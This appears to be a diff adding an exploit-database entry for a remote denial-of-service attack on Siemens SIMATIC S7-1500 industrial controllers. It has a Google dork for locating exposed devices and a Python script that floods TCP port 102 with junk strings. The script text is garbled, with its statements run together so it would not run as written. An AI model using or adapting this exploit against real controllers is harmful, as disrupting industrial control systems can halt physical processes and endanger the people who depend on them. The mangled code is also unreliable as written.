@@ -1,0 +1,18 @@
+# Exploit Title: Siemens SIMATIC S7-1500 CPU - Remote Denial of Service
+# Google Dork: inurl:/Portal/Portal.mwsl
+# Date: 2018-05-22
+# Exploit Author: t4rkd3vilz, Jameel Nabbo
+# Vendor Homepage: https://www.siemens.com/
+# Version: SIMATIC S7-1500 CPU all versions before V1.6
+# Tested on: Kali Linux
+# CVE: CVE-2014-5074
+
+
+#!/usr/bin/python
+
+import socket import sys from time import sleep if
+len(sys.argv) != 2: print "Usage: exploit.py <ip>" sys.exit(0) for x in
+range(1,50): s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#vulnerable TCP port 102 connect=s.connect((str(sys.argv[1]), 102))
+s.send('some evil string \r\n\n') print "bufff " + str(x) + " sent...\n"
+result=s.recv(1024) print result s.close() sleep(7)
